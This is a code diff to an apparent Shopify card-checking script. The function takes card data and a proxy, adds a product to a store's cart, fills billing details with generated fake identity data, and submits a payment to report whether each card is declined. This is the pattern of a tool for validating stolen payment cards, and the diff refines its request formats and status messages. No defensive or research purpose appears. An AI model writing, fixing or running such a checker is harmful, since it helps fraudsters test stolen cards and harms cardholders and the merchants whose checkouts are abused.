@@ -96,13 +96,13 @@ async def check_shopify_direct(session, site_url, price, card_data, proxy):
 
     # 1. Fetch Product
     async with session.get(f"{base_url}/products.json?limit=1", headers=headers, proxy=proxy, timeout=15) as resp:
-        if resp.status != 200: return "DECLINED", f"Site Error {resp.status}"
+        if resp.status != 200: return "DECLINED", f"SITE_ERROR_{resp.status}"
         data = await resp.json(content_type=None)
-        if not data.get("products"): return "DECLINED", "No products found"
+        if not data.get("products"): return "DECLINED", "NO_PRODUCTS"
         variant_id = data["products"][0]["variants"][0]["id"]
 
     # 2. Add to Cart
-    cart_payload = {"id": variant_id, "quantity": 1}
+    cart_payload = {"items": [{"id": variant_id, "quantity": 1}]}
     async with session.post(f"{base_url}/cart/add.js", headers={**headers, 'Content-Type': 'application/json'}, json=cart_payload, proxy=proxy, timeout=15) as resp:
         if resp.status != 200: return "DECLINED", "CART_ADD_FAILED"
 
@@ -140,9 +140,10 @@ async def check_shopify_direct(session, site_url, price, card_data, proxy):
 
     # 5. Submit Payment to Shopify
     fn, ln, street, city, state, zip_code, phone, email = gen_fake_data()
-    pay_url = f"https://checkout.shopify.com/checkouts/{checkout_token}/payments"
+    pay_url = f"https://checkout.shopify.com/payments"
     pay_payload = {
         "authenticity_token": auth_token,
+        "checkout_id": checkout_token,
         "payment_method_id": pm_id,
         "amount": price,
         "billing_address": {
@@ -153,7 +154,7 @@ async def check_shopify_direct(session, site_url, price, card_data, proxy):
     async with session.post(pay_url, headers={**headers, 'Content-Type': 'application/json'}, json=pay_payload, proxy=proxy, timeout=20) as resp:
         try: rj = await resp.json(content_type=None)
         except: return "DECLINED", "PAYMENT_SUBMIT_FAILED"
-            
+                
     status_str = json.dumps(rj).lower()
     if "card_declined" in status_str or "declined" in status_str:
         ft = rj.get("failure_type", rj.get("error", "CARD_DECLINED"))
